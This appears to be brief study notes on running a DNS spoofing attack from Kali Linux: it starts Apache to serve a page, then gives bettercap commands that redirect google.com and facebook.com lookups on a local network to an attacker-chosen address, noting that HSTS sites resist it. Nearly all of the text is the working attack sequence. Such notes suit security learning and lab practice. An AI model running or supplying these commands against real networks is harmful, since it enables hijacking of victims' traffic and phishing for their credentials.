# kali comes with its own web server
# we can start this service e.g.

service apache2 start

# go to your browser and key in your ip
# the default web page of kali will be served here
# this website is stored in 
var/www/html

bettercap -iface eth0 --caplet spoof.cap
dns.spoof.address <IP address to map the domains to>
set dns.spoof.all true
set dns.spoof.domains google.com,facebook.com
dns.spoof on

### the above attack won't work on websites that use hsts
